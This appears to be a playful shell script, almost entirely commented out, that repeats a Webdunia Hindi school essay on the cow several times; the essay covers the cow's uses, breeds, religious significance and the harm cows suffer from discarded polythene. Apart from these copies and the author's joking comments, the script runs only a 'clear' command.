#भूमिका : गाय का यूं तो पूरी दुनिया में ही काफी महत्व है, लेकिन भारत के संदर्भ में बात की जाए तो प्राचीन काल से यह भारत की अर्थव्यवस्था की रीढ़ रही है। चाहे वह दूध का मामला हो या फिर खेती के काम में आने वाले बैलों का। वैदिक काल में गायों की संख्‍या व्यक्ति की समृद्धि का मानक हुआ करती थी। दुधारू पशु होने के कारण यह बहुत उपयोगी घरेलू पशु है। 
 
#उपयोगिता : गाय का दूध बहुत ही पौष्टिक होता है। यह बीमारों और बच्चों के लिए बेहद उपयोगी आहार माना जाता है। इसके अलावा दूध से कई तरह के पकवान बनते हैं। दूध से दही, पनीर, मक्खन और घी भी बनाता है। गाय का घी और गोमूत्र अनेक आयुर्वेदिक औषधियां बनाने के काम भी काम आता है।

#गाय का गोबर फसलों के लिए सबसे उत्तम खाद है। गाय के मरने के बाद उसका चमड़ा, हड्डियां व सींग सहित सभी अंग किसी न किसी काम आते हैं। 

 
#अन्य पशुओं की तुलना में गाय का दूध बहुत उपयोगी होता है। बच्चों को विशेष तौर पर गाय का दूध पिलाने की सलाह दी जाती है क्योंकि भैंस का दूध जहां सुस्ती लाता है, वहीं गाय का दूध बच्चों में चंचलता बनाए रखता है। माना जाता है कि भैंस का बच्चा (पाड़ा) दूध पीने के बाद सो जाता है, जबकि गाय का बछड़ा अपनी मां का दूध पीने के बाद उछल-कूद करता है।
 
#गाय न सिर्फ अपने जीवन में लोगों के लिए उपयोगी होती है वरन मरने के बाद भी उसके शरीर का हर अंग काम आता है। गाय का चमड़ा, सींग, खुर से दैनिक जीवनोपयोगी सामान तैयार होता है। गाय की हड्‍डियों से तैयार खाद खेती के काम आती है।
 
 
#गाय की शारीरिक संरचना : गाय का एक मुंह, दो आंखें, दो कान, चार थन, दो सींग, दो नथुने तथा चार पांव होते हैं। पांवों के खुर गाय के लिए जूतों का काम करते हैं। गाय की पूंछ लंबी होती है तथा उसके किनारे पर एक गुच्छा भी होता है, जिसे वह मक्खियां आदि उड़ाने के काम में लेती है। गाय की एकाध प्रजाति में सींग नहीं होते। 
 
#गायों की प्रमुख नस्लें : गायों की यूं तो कई नस्लें होती हैं, लेकिन भारत में मुख्‍यत: सहिवाल (पंजाब, हरियाणा, दिल्ली, उत्तरप्रदेश, बिहार), गीर (दक्षिण काठियावाड़), थारपारकर (जोधपुर, जैसलमेर, कच्छ), करन फ्राइ (राजस्थान) आदि हैं। विदेशी नस्ल में जर्सी गाय सर्वाधिक लोकप्रिय है। यह गाय दूध भी अधिक देती है। भारतीय गाय छोटी होती है, जबकि विदेशी गाय का शरीर थोड़ा भारी होता है।

 
#गाय के रंग : गाय कई रंगों जैसे सफेद, काला, लाल, बादामी तथा चितकबरी होती है।
 #
#
#गाय का धार्मिक महत्व : भारत में गाय को देवी का दर्जा प्राप्त है। ऐसी मान्यता है कि गाय के शरीर में 33 करोड़ देवताओं का निवास है। यही कारण है कि दिवाली के दूसरे दिन गोवर्धन पूजा के अवसर पर गायों की विशेष पूजा की जाती है और उनका मोर पंखों आदि से श्रृंगार किया जाता है।
 #
#प्रा#चीन भारत में गाय समृद्धि का प्रतीक मानी जाती थी। युद्ध के दौरान स्वर्ण, आभूषणों के साथ गायों को भी लूट लिया जाता था। जिस राज्य में जितनी गायें होती थीं उसको उतना ही सम्पन्न माना जाता है। कृष्ण के गाय प्रेम को भला कौन नहीं जानता। इसी कारण उनका एक नाम गोपाल भी है। 
#
#निष्कर्ष : दुर्भाग्य से शहरों में जिस तरह पॉलिथिन का उपयोग किया जाता है और उसे फेंक दिया जाता है, उसे खाकर गायों की असमय मौत हो जाती है। इस दिशा में सभी को गंभीरता से विचार करना होगा ताकि हमारी 'आस्था' और 'अर्थव्यवस्था' के प्रतीक गोवंश को बचाया जा सके। कुल मिलाकर गाय का मनुष्य के जीवन में बहुत महत्व है। गाय आज भी ग्रामीण अर्थव्यवस्था की रीढ़ है।
 
#वेबदुनिया पर पढ़ें
#समाचारबॉलीवुडलाइफ स्‍टाइलज्योतिषमहाभारत के किस्सेरामायण की कहानियांधर्म-संसाररोचक और रोमांचक

#सम्बंधित जानकारी
#इ#ंदिरा गांधी पर हिन्दी निबंध
#हिन्दी निबंध : लाल बहादुर शास्त्री
#हिन्दी निबंध : झांसी की रानी लक्ष्मीबाई
#सरदार वल्लभ भाई पटेल पर हिन्दी निबंध
#आदर्श वीरांगना झांसी की रानी लक्ष्मीबाई पर हिन्दी निबंध...
#सभी देखें जरुर पढ़ें
#चटख हरे रंग का पिस्ता कई पोषक तत्वों से है भरपूर, जानें इसके 7 फायदे
#बढ़ती उम्र के प्रभाव को कम करने में कारगर है ये ड्रायफ्रूट, जानिए इसके फायदे
#प्रोटीन, विटामिन तो ठीक है लेकिन क्या सही मात्रा में ले रहे हैं मैग्नीशियम? ऐसे जानें
#ब#ेडौल शरीर को बनाना है परफेक्ट और मोटापे से पाना है निजात, तो जानें 7 काम की बातें
#आधे सिर में होता है दर्द, तो आजमाएं अजवाइन के ये 6 घरेलू नुस्खे
#सभी देखें नवीनतम
#Gopashtami 2019 : 4 नवंबर को गोपाष्टमी पर्व, जानिए कैसे करें गौ पूजन, पढ़ें 11 खास बातें
#गोपाष्टमी 2019 : गाय के पौराणिक और धार्मिक महत्व, जानकर चौंक जाएंगे
#gopashtami 2019 : गाय क्यों है महत्वपूर्ण, जानिए 17 वैज्ञानिक कारण
#Amla Navami 2019 : आंवला नवमी कब है, जानें महत्व, पूजन विधि एवं 10 खास बातें
#आप नहीं जानते होंगे गौ माता के शुभ शकुन से जुड़ीं ये 11 बातें, जानें अचूक उपाय भी
#अगला लेख
#नहाते हुए पुराना लूफाह इस्तेमाल करते हैं तो तुरंत फेंक दे, वर्ना संक्रमण का है खतरा





#गाय पर हिन्दी में निबंध


#Webdunia
#भूमिका : गाय का यूं तो पूरी दुनिया में ही काफी महत्व है, लेकिन भारत के संदर्भ में बात की जाए तो प्राचीन काल से यह भारत की अर्थव्यवस्था की रीढ़ रही है। चाहे वह दूध का मामला हो या फिर खेती के काम में आने वाले बैलों का। वैदिक काल में गायों की संख्‍या व्यक्ति की समृद्धि का मानक हुआ करती थी। दुधारू पशु होने के कारण यह बहुत उपयोगी घरेलू पशु है। 
 
#उपयोगिता : गाय का दूध बहुत ही पौष्टिक होता है। यह बीमारों और बच्चों के लिए बेहद उपयोगी आहार माना जाता है। इसके अलावा दूध से कई तरह के पकवान बनते हैं। दूध से दही, पनीर, मक्खन और घी भी बनाता है। गाय का घी और गोमूत्र अनेक आयुर्वेदिक औषधियां बनाने के काम भी काम आता है।

#गाय का गोबर फसलों के लिए सबसे उत्तम खाद है। गाय के मरने के बाद उसका चमड़ा, हड्डियां व सींग सहित सभी अंग किसी न किसी काम आते हैं। 

 
#अन्य पशुओं की तुलना में गाय का दूध बहुत उपयोगी होता है। बच्चों को विशेष तौर पर गाय का दूध पिलाने की सलाह दी जाती है क्योंकि भैंस का दूध जहां सुस्ती लाता है, वहीं गाय का दूध बच्चों में चंचलता बनाए रखता है। माना जाता है कि भैंस का बच्चा (पाड़ा) दूध पीने के बाद सो जाता है, जबकि गाय का बछड़ा अपनी मां का दूध पीने के बाद उछल-कूद करता है।
 
#गाय न सिर्फ अपने जीवन में लोगों के लिए उपयोगी होती है वरन मरने के बाद भी उसके शरीर का हर अंग काम आता है। गाय का चमड़ा, सींग, खुर से दैनिक जीवनोपयोगी सामान तैयार होता है। गाय की हड्‍डियों से तैयार खाद खेती के काम आती है।
 
 
#गाय की शारीरिक संरचना : गाय का एक मुंह, दो आंखें, दो कान, चार थन, दो सींग, दो नथुने तथा चार पांव होते हैं। पांवों के खुर गाय के लिए जूतों का काम करते हैं। गाय की पूंछ लंबी होती है तथा उसके किनारे पर एक गुच्छा भी होता है, जिसे वह मक्खियां आदि उड़ाने के काम में लेती है। गाय की एकाध प्रजाति में सींग नहीं होते। 
 
#गायों की प्रमुख नस्लें : गायों की यूं तो कई नस्लें होती हैं, लेकिन भारत में मुख्‍यत: सहिवाल (पंजाब, हरियाणा, दिल्ली, उत्तरप्रदेश, बिहार), गीर (दक्षिण काठियावाड़), थारपारकर (जोधपुर, जैसलमेर, कच्छ), करन फ्राइ (राजस्थान) आदि हैं। विदेशी नस्ल में जर्सी गाय सर्वाधिक लोकप्रिय है। यह गाय दूध भी अधिक देती है। भारतीय गाय छोटी होती है, जबकि विदेशी गाय का शरीर थोड़ा भारी होता है।

 
#गाय के रंग : गाय कई रंगों जैसे सफेद, काला, लाल, बादामी तथा चितकबरी होती है।
 #
#
#गाय का धार्मिक महत्व : भारत में गाय को देवी का दर्जा प्राप्त है। ऐसी मान्यता है कि गाय के शरीर में 33 करोड़ देवताओं का निवास है। यही कारण है कि दिवाली के दूसरे दिन गोवर्धन पूजा के अवसर पर गायों की विशेष पूजा की जाती है और उनका मोर पंखों आदि से श्रृंगार किया जाता है।
 #
#प्रा#चीन भारत में गाय समृद्धि का प्रतीक मानी जाती थी। युद्ध के दौरान स्वर्ण, आभूषणों के साथ गायों को भी लूट लिया जाता था। जिस राज्य में जितनी गायें होती थीं उसको उतना ही सम्पन्न माना जाता है। कृष्ण के गाय प्रेम को भला कौन नहीं जानता। इसी कारण उनका एक नाम गोपाल भी है। 
#
#निष्कर्ष : दुर्भाग्य से शहरों में जिस तरह पॉलिथिन का उपयोग किया जाता है और उसे फेंक दिया जाता है, उसे खाकर गायों की असमय मौत हो जाती है। इस दिशा में सभी को गंभीरता से विचार करना होगा ताकि हमारी 'आस्था' और 'अर्थव्यवस्था' के प्रतीक गोवंश को बचाया जा सके। कुल मिलाकर गाय का मनुष्य के जीवन में बहुत महत्व है। गाय आज भी ग्रामीण अर्थव्यवस्था की रीढ़ है।
 
#वेबदुनिया पर पढ़ें
#समाचारबॉलीवुडलाइफ स्‍टाइलज्योतिषमहाभारत के किस्सेरामायण की कहानियांधर्म-संसाररोचक और रोमांचक

#सम्बंधित जानकारी
#इ#ंदिरा गांधी पर हिन्दी निबंध
#हिन्दी निबंध : लाल बहादुर शास्त्री
#हिन्दी निबंध : झांसी की रानी लक्ष्मीबाई
#सरदार वल्लभ भाई पटेल पर हिन्दी निबंध
#आदर्श वीरांगना झांसी की रानी लक्ष्मीबाई पर हिन्दी निबंध...
#सभी देखें जरुर पढ़ें
#चटख हरे रंग का पिस्ता कई पोषक तत्वों से है भरपूर, जानें इसके 7 फायदे
#बढ़ती उम्र के प्रभाव को कम करने में कारगर है ये ड्रायफ्रूट, जानिए इसके फायदे
#प्रोटीन, विटामिन तो ठीक है लेकिन क्या सही मात्रा में ले रहे हैं मैग्नीशियम? ऐसे जानें
#ब#ेडौल शरीर को बनाना है परफेक्ट और मोटापे से पाना है निजात, तो जानें 7 काम की बातें
#आधे सिर में होता है दर्द, तो आजमाएं अजवाइन के ये 6 घरेलू नुस्खे
#सभी देखें नवीनतम
#Gopashtami 2019 : 4 नवंबर को गोपाष्टमी पर्व, जानिए कैसे करें गौ पूजन, पढ़ें 11 खास बातें
#गोपाष्टमी 2019 : गाय के पौराणिक और धार्मिक महत्व, जानकर चौंक जाएंगे
#gopashtami 2019 : गाय क्यों है महत्वपूर्ण, जानिए 17 वैज्ञानिक कारण
#Amla Navami 2019 : आंवला नवमी कब है, जानें महत्व, पूजन विधि एवं 10 खास बातें
#आप नहीं जानते होंगे गौ माता के शुभ शकुन से जुड़ीं ये 11 बातें, जानें अचूक उपाय भी
#अगला लेख
#नहाते हुए पुराना लूफाह इस्तेमाल करते हैं तो तुरंत फेंक दे, वर्ना संक्रमण का है खतरा



#यदि समझ आ गया तो अब सो जाओ









#अब सब प्रतिरूप कर के चिपकने वाले है








clear
























































#स्वगत है मेरा script में
































#आज हम सीखेंगे की गाय किसी कहते है ओर उसी के विषय मे सब कुछ



















#ओर नीचे आओ













#👇👇




































#👇👇👇👇










































































#👇👇👇👇👇👇👇👇👇👇👇








































































#यदि देखने का मन नही है तो मत देखो










































#👇👇👇👇👇👇👇👇👇👇👇👇👇👇👇👇👇👇
















































#गाय पर हिन्दी में निबंध


#Webdunia
#भूमिका : गाय का यूं तो पूरी दुनिया में ही काफी महत्व है, लेकिन भारत के संदर्भ में बात की जाए तो प्राचीन काल से यह भारत की अर्थव्यवस्था की रीढ़ रही है। चाहे वह दूध का मामला हो या फिर खेती के काम में आने वाले बैलों का। वैदिक काल में गायों की संख्‍या व्यक्ति की समृद्धि का मानक हुआ करती थी। दुधारू पशु होने के कारण यह बहुत उपयोगी घरेलू पशु है। 
 
#उपयोगिता : गाय का दूध बहुत ही पौष्टिक होता है। यह बीमारों और बच्चों के लिए बेहद उपयोगी आहार माना जाता है। इसके अलावा दूध से कई तरह के पकवान बनते हैं। दूध से दही, पनीर, मक्खन और घी भी बनाता है। गाय का घी और गोमूत्र अनेक आयुर्वेदिक औषधियां बनाने के काम भी काम आता है।

#गाय का गोबर फसलों के लिए सबसे उत्तम खाद है। गाय के मरने के बाद उसका चमड़ा, हड्डियां व सींग सहित सभी अंग किसी न किसी काम आते हैं। 

 
#अन्य पशुओं की तुलना में गाय का दूध बहुत उपयोगी होता है। बच्चों को विशेष तौर पर गाय का दूध पिलाने की सलाह दी जाती है क्योंकि भैंस का दूध जहां सुस्ती लाता है, वहीं गाय का दूध बच्चों में चंचलता बनाए रखता है। माना जाता है कि भैंस का बच्चा (पाड़ा) दूध पीने के बाद सो जाता है, जबकि गाय का बछड़ा अपनी मां का दूध पीने के बाद उछल-कूद करता है।
 
#गाय न सिर्फ अपने जीवन में लोगों के लिए उपयोगी होती है वरन मरने के बाद भी उसके शरीर का हर अंग काम आता है। गाय का चमड़ा, सींग, खुर से दैनिक जीवनोपयोगी सामान तैयार होता है। गाय की हड्‍डियों से तैयार खाद खेती के काम आती है।
 
 
#गाय की शारीरिक संरचना : गाय का एक मुंह, दो आंखें, दो कान, चार थन, दो सींग, दो नथुने तथा चार पांव होते हैं। पांवों के खुर गाय के लिए जूतों का काम करते हैं। गाय की पूंछ लंबी होती है तथा उसके किनारे पर एक गुच्छा भी होता है, जिसे वह मक्खियां आदि उड़ाने के काम में लेती है। गाय की एकाध प्रजाति में सींग नहीं होते। 
 
#गायों की प्रमुख नस्लें : गायों की यूं तो कई नस्लें होती हैं, लेकिन भारत में मुख्‍यत: सहिवाल (पंजाब, हरियाणा, दिल्ली, उत्तरप्रदेश, बिहार), गीर (दक्षिण काठियावाड़), थारपारकर (जोधपुर, जैसलमेर, कच्छ), करन फ्राइ (राजस्थान) आदि हैं। विदेशी नस्ल में जर्सी गाय सर्वाधिक लोकप्रिय है। यह गाय दूध भी अधिक देती है। भारतीय गाय छोटी होती है, जबकि विदेशी गाय का शरीर थोड़ा भारी होता है।

 
#गाय के रंग : गाय कई रंगों जैसे सफेद, काला, लाल, बादामी तथा चितकबरी होती है।
 #
#
#गाय का धार्मिक महत्व : भारत में गाय को देवी का दर्जा प्राप्त है। ऐसी मान्यता है कि गाय के शरीर में 33 करोड़ देवताओं का निवास है। यही कारण है कि दिवाली के दूसरे दिन गोवर्धन पूजा के अवसर पर गायों की विशेष पूजा की जाती है और उनका मोर पंखों आदि से श्रृंगार किया जाता है।
 #
#प्रा#चीन भारत में गाय समृद्धि का प्रतीक मानी जाती थी। युद्ध के दौरान स्वर्ण, आभूषणों के साथ गायों को भी लूट लिया जाता था। जिस राज्य में जितनी गायें होती थीं उसको उतना ही सम्पन्न माना जाता है। कृष्ण के गाय प्रेम को भला कौन नहीं जानता। इसी कारण उनका एक नाम गोपाल भी है। 
#
#निष्कर्ष : दुर्भाग्य से शहरों में जिस तरह पॉलिथिन का उपयोग किया जाता है और उसे फेंक दिया जाता है, उसे खाकर गायों की असमय मौत हो जाती है। इस दिशा में सभी को गंभीरता से विचार करना होगा ताकि हमारी 'आस्था' और 'अर्थव्यवस्था' के प्रतीक गोवंश को बचाया जा सके। कुल मिलाकर गाय का मनुष्य के जीवन में बहुत महत्व है। गाय आज भी ग्रामीण अर्थव्यवस्था की रीढ़ है।
 
#वेबदुनिया पर पढ़ें
#समाचारबॉलीवुडलाइफ स्‍टाइलज्योतिषमहाभारत के किस्सेरामायण की कहानियांधर्म-संसाररोचक और रोमांचक

#सम्बंधित जानकारी
#इ#ंदिरा गांधी पर हिन्दी निबंध
#हिन्दी निबंध : लाल बहादुर शास्त्री
#हिन्दी निबंध : झांसी की रानी लक्ष्मीबाई
#सरदार वल्लभ भाई पटेल पर हिन्दी निबंध
#आदर्श वीरांगना झांसी की रानी लक्ष्मीबाई पर हिन्दी निबंध...
#सभी देखें जरुर पढ़ें
#चटख हरे रंग का पिस्ता कई पोषक तत्वों से है भरपूर, जानें इसके 7 फायदे
#बढ़ती उम्र के प्रभाव को कम करने में कारगर है ये ड्रायफ्रूट, जानिए इसके फायदे
#प्रोटीन, विटामिन तो ठीक है लेकिन क्या सही मात्रा में ले रहे हैं मैग्नीशियम? ऐसे जानें
#ब#ेडौल शरीर को बनाना है परफेक्ट और मोटापे से पाना है निजात, तो जानें 7 काम की बातें
#आधे सिर में होता है दर्द, तो आजमाएं अजवाइन के ये 6 घरेलू नुस्खे
#सभी देखें नवीनतम
#Gopashtami 2019 : 4 नवंबर को गोपाष्टमी पर्व, जानिए कैसे करें गौ पूजन, पढ़ें 11 खास बातें
#गोपाष्टमी 2019 : गाय के पौराणिक और धार्मिक महत्व, जानकर चौंक जाएंगे
#gopashtami 2019 : गाय क्यों है महत्वपूर्ण, जानिए 17 वैज्ञानिक कारण
#Amla Navami 2019 : आंवला नवमी कब है, जानें महत्व, पूजन विधि एवं 10 खास बातें
#आप नहीं जानते होंगे गौ माता के शुभ शकुन से जुड़ीं ये 11 बातें, जानें अचूक उपाय भी
#अगला लेख
#नहाते हुए पुराना लूफाह इस्तेमाल करते हैं तो तुरंत फेंक दे, वर्ना संक्रमण का है खतरा








#फिर से पढ़ लो











#गाय पर हिन्दी में निबंध


#Webdunia
#भूमिका : गाय का यूं तो पूरी दुनिया में ही काफी महत्व है, लेकिन भारत के संदर्भ में बात की जाए तो प्राचीन काल से यह भारत की अर्थव्यवस्था की रीढ़ रही है। चाहे वह दूध का मामला हो या फिर खेती के काम में आने वाले बैलों का। वैदिक काल में गायों की संख्‍या व्यक्ति की समृद्धि का मानक हुआ करती थी। दुधारू पशु होने के कारण यह बहुत उपयोगी घरेलू पशु है। 
 
#उपयोगिता : गाय का दूध बहुत ही पौष्टिक होता है। यह बीमारों और बच्चों के लिए बेहद उपयोगी आहार माना जाता है। इसके अलावा दूध से कई तरह के पकवान बनते हैं। दूध से दही, पनीर, मक्खन और घी भी बनाता है। गाय का घी और गोमूत्र अनेक आयुर्वेदिक औषधियां बनाने के काम भी काम आता है।

#गाय का गोबर फसलों के लिए सबसे उत्तम खाद है। गाय के मरने के बाद उसका चमड़ा, हड्डियां व सींग सहित सभी अंग किसी न किसी काम आते हैं। 

 
#अन्य पशुओं की तुलना में गाय का दूध बहुत उपयोगी होता है। बच्चों को विशेष तौर पर गाय का दूध पिलाने की सलाह दी जाती है क्योंकि भैंस का दूध जहां सुस्ती लाता है, वहीं गाय का दूध बच्चों में चंचलता बनाए रखता है। माना जाता है कि भैंस का बच्चा (पाड़ा) दूध पीने के बाद सो जाता है, जबकि गाय का बछड़ा अपनी मां का दूध पीने के बाद उछल-कूद करता है।
 
#गाय न सिर्फ अपने जीवन में लोगों के लिए उपयोगी होती है वरन मरने के बाद भी उसके शरीर का हर अंग काम आता है। गाय का चमड़ा, सींग, खुर से दैनिक जीवनोपयोगी सामान तैयार होता है। गाय की हड्‍डियों से तैयार खाद खेती के काम आती है।
 
 
#गाय की शारीरिक संरचना : गाय का एक मुंह, दो आंखें, दो कान, चार थन, दो सींग, दो नथुने तथा चार पांव होते हैं। पांवों के खुर गाय के लिए जूतों का काम करते हैं। गाय की पूंछ लंबी होती है तथा उसके किनारे पर एक गुच्छा भी होता है, जिसे वह मक्खियां आदि उड़ाने के काम में लेती है। गाय की एकाध प्रजाति में सींग नहीं होते। 
 
#गायों की प्रमुख नस्लें : गायों की यूं तो कई नस्लें होती हैं, लेकिन भारत में मुख्‍यत: सहिवाल (पंजाब, हरियाणा, दिल्ली, उत्तरप्रदेश, बिहार), गीर (दक्षिण काठियावाड़), थारपारकर (जोधपुर, जैसलमेर, कच्छ), करन फ्राइ (राजस्थान) आदि हैं। विदेशी नस्ल में जर्सी गाय सर्वाधिक लोकप्रिय है। यह गाय दूध भी अधिक देती है। भारतीय गाय छोटी होती है, जबकि विदेशी गाय का शरीर थोड़ा भारी होता है।

 
#गाय के रंग : गाय कई रंगों जैसे सफेद, काला, लाल, बादामी तथा चितकबरी होती है।
 #
#
#गाय का धार्मिक महत्व : भारत में गाय को देवी का दर्जा प्राप्त है। ऐसी मान्यता है कि गाय के शरीर में 33 करोड़ देवताओं का निवास है। यही कारण है कि दिवाली के दूसरे दिन गोवर्धन पूजा के अवसर पर गायों की विशेष पूजा की जाती है और उनका मोर पंखों आदि से श्रृंगार किया जाता है।
 #
#प्रा#चीन भारत में गाय समृद्धि का प्रतीक मानी जाती थी। युद्ध के दौरान स्वर्ण, आभूषणों के साथ गायों को भी लूट लिया जाता था। जिस राज्य में जितनी गायें होती थीं उसको उतना ही सम्पन्न माना जाता है। कृष्ण के गाय प्रेम को भला कौन नहीं जानता। इसी कारण उनका एक नाम गोपाल भी है। 
#
#निष्कर्ष : दुर्भाग्य से शहरों में जिस तरह पॉलिथिन का उपयोग किया जाता है और उसे फेंक दिया जाता है, उसे खाकर गायों की असमय मौत हो जाती है। इस दिशा में सभी को गंभीरता से विचार करना होगा ताकि हमारी 'आस्था' और 'अर्थव्यवस्था' के प्रतीक गोवंश को बचाया जा सके। कुल मिलाकर गाय का मनुष्य के जीवन में बहुत महत्व है। गाय आज भी ग्रामीण अर्थव्यवस्था की रीढ़ है।
 
#वेबदुनिया पर पढ़ें
#समाचारबॉलीवुडलाइफ स्‍टाइलज्योतिषमहाभारत के किस्सेरामायण की कहानियांधर्म-संसाररोचक और रोमांचक

#सम्बंधित जानकारी
#इ#ंदिरा गांधी पर हिन्दी निबंध
#हिन्दी निबंध : लाल बहादुर शास्त्री
#हिन्दी निबंध : झांसी की रानी लक्ष्मीबाई
#सरदार वल्लभ भाई पटेल पर हिन्दी निबंध
#आदर्श वीरांगना झांसी की रानी लक्ष्मीबाई पर हिन्दी निबंध...
#सभी देखें जरुर पढ़ें
#चटख हरे रंग का पिस्ता कई पोषक तत्वों से है भरपूर, जानें इसके 7 फायदे
#बढ़ती उम्र के प्रभाव को कम करने में कारगर है ये ड्रायफ्रूट, जानिए इसके फायदे
#प्रोटीन, विटामिन तो ठीक है लेकिन क्या सही मात्रा में ले रहे हैं मैग्नीशियम? ऐसे जानें
#ब#ेडौल शरीर को बनाना है परफेक्ट और मोटापे से पाना है निजात, तो जानें 7 काम की बातें
#आधे सिर में होता है दर्द, तो आजमाएं अजवाइन के ये 6 घरेलू नुस्खे
#सभी देखें नवीनतम
#Gopashtami 2019 : 4 नवंबर को गोपाष्टमी पर्व, जानिए कैसे करें गौ पूजन, पढ़ें 11 खास बातें
#गोपाष्टमी 2019 : गाय के पौराणिक और धार्मिक महत्व, जानकर चौंक जाएंगे
#gopashtami 2019 : गाय क्यों है महत्वपूर्ण, जानिए 17 वैज्ञानिक कारण
#Amla Navami 2019 : आंवला नवमी कब है, जानें महत्व, पूजन विधि एवं 10 खास बातें
#आप नहीं जानते होंगे गौ माता के शुभ शकुन से जुड़ीं ये 11 बातें, जानें अचूक उपाय भी
#अगला लेख
#नहाते हुए पुराना लूफाह इस्तेमाल करते हैं तो तुरंत फेंक दे, वर्ना संक्रमण का है खतरा



#गाय पर हिन्दी में निबंध


#Webdunia
#भूमिका : गाय का यूं तो पूरी दुनिया में ही काफी महत्व है, लेकिन भारत के संदर्भ में बात की जाए तो प्राचीन काल से यह भारत की अर्थव्यवस्था की रीढ़ रही है। चाहे वह दूध का मामला हो या फिर खेती के काम में आने वाले बैलों का। वैदिक काल में गायों की संख्‍या व्यक्ति की समृद्धि का मानक हुआ करती थी। दुधारू पशु होने के कारण यह बहुत उपयोगी घरेलू पशु है। 
 
#उपयोगिता : गाय का दूध बहुत ही पौष्टिक होता है। यह बीमारों और बच्चों के लिए बेहद उपयोगी आहार माना जाता है। इसके अलावा दूध से कई तरह के पकवान बनते हैं। दूध से दही, पनीर, मक्खन और घी भी बनाता है। गाय का घी और गोमूत्र अनेक आयुर्वेदिक औषधियां बनाने के काम भी काम आता है।

#गाय का गोबर फसलों के लिए सबसे उत्तम खाद है। गाय के मरने के बाद उसका चमड़ा, हड्डियां व सींग सहित सभी अंग किसी न किसी काम आते हैं। 

 
#अन्य पशुओं की तुलना में गाय का दूध बहुत उपयोगी होता है। बच्चों को विशेष तौर पर गाय का दूध पिलाने की सलाह दी जाती है क्योंकि भैंस का दूध जहां सुस्ती लाता है, वहीं गाय का दूध बच्चों में चंचलता बनाए रखता है। माना जाता है कि भैंस का बच्चा (पाड़ा) दूध पीने के बाद सो जाता है, जबकि गाय का बछड़ा अपनी मां का दूध पीने के बाद उछल-कूद करता है।
 
#गाय न सिर्फ अपने जीवन में लोगों के लिए उपयोगी होती है वरन मरने के बाद भी उसके शरीर का हर अंग काम आता है। गाय का चमड़ा, सींग, खुर से दैनिक जीवनोपयोगी सामान तैयार होता है। गाय की हड्‍डियों से तैयार खाद खेती के काम आती है।
 
 
#गाय की शारीरिक संरचना : गाय का एक मुंह, दो आंखें, दो कान, चार थन, दो सींग, दो नथुने तथा चार पांव होते हैं। पांवों के खुर गाय के लिए जूतों का काम करते हैं। गाय की पूंछ लंबी होती है तथा उसके किनारे पर एक गुच्छा भी होता है, जिसे वह मक्खियां आदि उड़ाने के काम में लेती है। गाय की एकाध प्रजाति में सींग नहीं होते। 
 
#गायों की प्रमुख नस्लें : गायों की यूं तो कई नस्लें होती हैं, लेकिन भारत में मुख्‍यत: सहिवाल (पंजाब, हरियाणा, दिल्ली, उत्तरप्रदेश, बिहार), गीर (दक्षिण काठियावाड़), थारपारकर (जोधपुर, जैसलमेर, कच्छ), करन फ्राइ (राजस्थान) आदि हैं। विदेशी नस्ल में जर्सी गाय सर्वाधिक लोकप्रिय है। यह गाय दूध भी अधिक देती है। भारतीय गाय छोटी होती है, जबकि विदेशी गाय का शरीर थोड़ा भारी होता है।

 
#गाय के रंग : गाय कई रंगों जैसे सफेद, काला, लाल, बादामी तथा चितकबरी होती है।
 #
#
#गाय का धार्मिक महत्व : भारत में गाय को देवी का दर्जा प्राप्त है। ऐसी मान्यता है कि गाय के शरीर में 33 करोड़ देवताओं का निवास है। यही कारण है कि दिवाली के दूसरे दिन गोवर्धन पूजा के अवसर पर गायों की विशेष पूजा की जाती है और उनका मोर पंखों आदि से श्रृंगार किया जाता है।
 #
#प्रा#चीन भारत में गाय समृद्धि का प्रतीक मानी जाती थी। युद्ध के दौरान स्वर्ण, आभूषणों के साथ गायों को भी लूट लिया जाता था। जिस राज्य में जितनी गायें होती थीं उसको उतना ही सम्पन्न माना जाता है। कृष्ण के गाय प्रेम को भला कौन नहीं जानता। इसी कारण उनका एक नाम गोपाल भी है। 
#
#निष्कर्ष : दुर्भाग्य से शहरों में जिस तरह पॉलिथिन का उपयोग किया जाता है और उसे फेंक दिया जाता है, उसे खाकर गायों की असमय मौत हो जाती है। इस दिशा में सभी को गंभीरता से विचार करना होगा ताकि हमारी 'आस्था' और 'अर्थव्यवस्था' के प्रतीक गोवंश को बचाया जा सके। कुल मिलाकर गाय का मनुष्य के जीवन में बहुत महत्व है। गाय आज भी ग्रामीण अर्थव्यवस्था की रीढ़ है।
 
#वेबदुनिया पर पढ़ें
#समाचारबॉलीवुडलाइफ स्‍टाइलज्योतिषमहाभारत के किस्सेरामायण की कहानियांधर्म-संसाररोचक और रोमांचक

#सम्बंधित जानकारी
#इ#ंदिरा गांधी पर हिन्दी निबंध
#हिन्दी निबंध : लाल बहादुर शास्त्री
#हिन्दी निबंध : झांसी की रानी लक्ष्मीबाई
#सरदार वल्लभ भाई पटेल पर हिन्दी निबंध
#आदर्श वीरांगना झांसी की रानी लक्ष्मीबाई पर हिन्दी निबंध...
#सभी देखें जरुर पढ़ें
#चटख हरे रंग का पिस्ता कई पोषक तत्वों से है भरपूर, जानें इसके 7 फायदे
#बढ़ती उम्र के प्रभाव को कम करने में कारगर है ये ड्रायफ्रूट, जानिए इसके फायदे
#प्रोटीन, विटामिन तो ठीक है लेकिन क्या सही मात्रा में ले रहे हैं मैग्नीशियम? ऐसे जानें
#ब#ेडौल शरीर को बनाना है परफेक्ट और मोटापे से पाना है निजात, तो जानें 7 काम की बातें
#आधे सिर में होता है दर्द, तो आजमाएं अजवाइन के ये 6 घरेलू नुस्खे
#सभी देखें नवीनतम
#Gopashtami 2019 : 4 नवंबर को गोपाष्टमी पर्व, जानिए कैसे करें गौ पूजन, पढ़ें 11 खास बातें
#गोपाष्टमी 2019 : गाय के पौराणिक और धार्मिक महत्व, जानकर चौंक जाएंगे
#gopashtami 2019 : गाय क्यों है महत्वपूर्ण, जानिए 17 वैज्ञानिक कारण
#Amla Navami 2019 : आंवला नवमी कब है, जानें महत्व, पूजन विधि एवं 10 खास बातें
#आप नहीं जानते होंगे गौ माता के शुभ शकुन से जुड़ीं ये 11 बातें, जानें अचूक उपाय भी
#अगला लेख
#नहाते हुए पुराना लूफाह इस्तेमाल करते हैं तो तुरंत फेंक दे, वर्ना संक्रमण का है खतरा




#गाय पर हिन्दी में निबंध


#Webdunia
